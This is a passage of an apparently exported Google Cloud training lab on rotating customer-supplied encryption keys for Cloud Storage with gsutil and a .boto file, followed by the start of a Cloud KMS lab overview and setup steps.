class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nano .boto</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Locate the current </span><strong><span>encryption_key</span></strong><span> line and comment it out by adding the # character to the beginning of the line.</span></p></li><li><p><span>Add a new line with </span><strong><span>encryption_key=</span></strong><span> and paste the new key value.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Before:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">encryption_key=2dFWQGnKhjOcz4h0CudPdVHLG2g+OoxP8FQOIKKTzsg=</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">After:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># encryption_key=2dFWQGnKhjOcz4h0CudPdVHLG2g+OoxP8FQOIKKTzsg=</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">encryption_key=HbFK4I8CaStcvKKIx6aNpdTse0kTsfZNUjFpM+YUEjY=</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><ol start='' ><li><p><span>Uncomment the </span><strong><span>decryption_key1=</span></strong><span> line by removing the # character.</span></p></li><li><p><span>Copy the value of the original </span><strong><span>encryption_key</span></strong><span> from the line that was commented out, and paste it for the value of the </span><strong><span>decryption_key1</span></strong><span> line.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Before:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># encryption_key=2dFWQGnKhjOcz4h0CudPdVHLG2g+OoxP8FQOIKKTzsg=</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">encryption_key=HbFK4I8CaStcvKKIx6aNpdTse0kTsfZNUjFpM+YUEjY==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># decryption_key1=</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">After:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># encryption_key=2dFWQGnKhjOcz4h0CudPdVHLG2g+OoxP8FQOIKKTzsg=</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">encryption_key=HbFK4I8CaStcvKKIx6aNpdTse0kTsfZNUjFpM+YUEjY==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">decryption_key1=2dFWQGnKhjOcz4h0CudPdVHLG2g+OoxP8FQOIKKTzsg=</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 248px;"></div><div class="CodeMirror-gutters" style="display: none; height: 248px;"></div></div></div></pre><p><span>The original encryption_key line that is commented out can also be completely deleted from the file.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+X</span></strong><span> to Exit, </span><strong><span>Y</span></strong><span> to save the file, then </span><strong><span>Enter</span></strong><span> to confirm the filename.</span></p></li></ol><h5 id='encrypt-a-file-with-the-new-key-and-decrypt-a-file-with-the-old-key'><span>Encrypt a file with the new key and decrypt a file with the old key</span></h5><ol start='' ><li><p><span>Upload a new file to the bucket. This file will be encrypted with the new key:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp setup3.html gs://$BUCKET_NAME</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> At this point, setup.html and setup2.html are encrypted with the original key and setup3.html is encrypted with the new key.</span></p><ol start='' ><li><p><span>Delete the local </span><strong><span>setup2.html</span></strong><span> and </span><strong><span>setup3.html</span></strong><span> files with the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rm setup2.html</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rm setup3.html</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To copy the files back from the storage bucket, run the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp gs://$BUCKET_NAME/setup2.html ./</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp gs://$BUCKET_NAME/setup3.html ./</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>View the encrypted file to see whether they made it back with the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat setup2.html</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat setup3.html</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> This lab demonstrates how new keys can be generated for new data, but note that files encrypted with the older keys can still be decrypted.</span></p><h5 id='rewrite-the-key-for-file-1-and-comment-out-the-old-decrypt-key'><span>Rewrite the key for file 1 and comment out the old decrypt key</span></h5><p><span>Rewriting an encrypted file causes the file to be decrypted it using the decryption_key1 that you previously set, and encrypts the file with the new encryption_key.</span></p><ol start='' ><li><p><span>Run the following command to rewrite setup.html</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil rewrite -k gs://$BUCKET_NAME/setup.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> At this point, setup.html has been rewritten with the new encryption key and setup3.html is encrypted with the new key as well. The setup2.html file is still encrypted with the original key so that you can see what happens if you don&#39;t rotate the keys properly.</span></p><ol start='' ><li><p><span>Open the boto file with the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nano .boto</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Comment out the current </span><strong><span>decryption_key1</span></strong><span> line by adding the # character back in.</span></p></li><li><p><span>Press </span><strong><span>Ctrl+X</span></strong><span> to Exit, </span><strong><span>Y</span></strong><span> to save the file, then </span><strong><span>Enter</span></strong><span> to confirm the filename.</span></p></li><li><p><span>Delete all three local files with the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rm setup*.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Download </span><strong><span>setup.html</span></strong><span> and </span><strong><span>setup3.html</span></strong><span> (both encrypted with the new key) with following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp gs://$BUCKET_NAME/setup.html ./</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp gs://$BUCKET_NAME/setup3.html ./</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>View the encrypted files to see whether they made it back through the process using the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat setup.html</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat setup3.html</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Try to download </span><strong><span>setup2.html</span></strong><span> (encrypted with the original key) using the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp gs://$BUCKET_NAME/setup2.html ./</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> What happened? </span><strong><span>setup2.html</span></strong><span> was not rewritten with the new key, so it can no longer be decrypted, and the copy failed.</span></p><p><span>You have successfully rotated the CSEK keys.</span></p><h4 id='congratulations-12'><span>Congratulations!</span></h4><p><span>In this lab, you have done the following:</span></p><ul><li><p><span>Configured CSEK for Cloud Storage.</span></p></li><li><p><span>Utilized CSEK to encrypt files in Cloud Storage.</span></p></li><li><p><span>Deleted local files from Cloud Storage and verified encryption.</span></p></li><li><p><span>Rotated your encryption keys without downloading and re-uploading data.</span></p></li></ul><p>&nbsp;</p><h3 id='lab---using-customer-managed-encryption-keys-with-cloud-storage-and-cloud-kms'><span>LAB - Using Customer-Managed Encryption Keys with Cloud Storage and Cloud KMS</span></h3><h4 id='overview-15'><span>Overview</span></h4><p><a href='https://cloud.google.com/security-key-management'><span>Cloud Key Management Service</span></a><span> (Cloud KMS) allows you to manage encryption keys on Google Cloud. Encryption keys are created by Cloud KMS and managed by you in the same manner you would manage them on-premises.</span></p><p><span>Using Cloud KMS you can generate, use, rotate and destroy AES256 symmetric encryption keys for direct use by all of your cloud services.</span></p><p><span>In this lab, you will use Cloud KMS to create KeyRings and CryptoKeys and then use those keys with Cloud Storage to set default keys on buckets, and encrypt individual objects with a Cloud KMS key.</span></p><p><span>Additionally, you will manually perform server-side encryption with your Cloud KMS keys, and upload encrypted data to Cloud Storage.</span></p><p><span>Cloud KMS permissions will be managed with IAM, and Cloud Audit Logs will be used to view all activity for CryptoKeys and KeyRings.</span></p><h5 id='objectives-12'><span>Objectives</span></h5><p><span>In this lab, you will learn how to do the following:</span></p><ul><li><p><span>Manage keys and encrypted data using Cloud KMS.</span></p></li><li><p><span>Create KeyRings and CryptoKeys.</span></p></li><li><p><span>Set a default encryption key for a storage bucket.</span></p></li><li><p><span>Encrypt an object with a Cloud KMS key.</span></p></li><li><p><span>Rotate encryption keys.</span></p></li><li><p><span>Perform server-side encryption manually with Cloud KMS keys.</span></p></li></ul><h4 id='setup-and-requirements-12'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
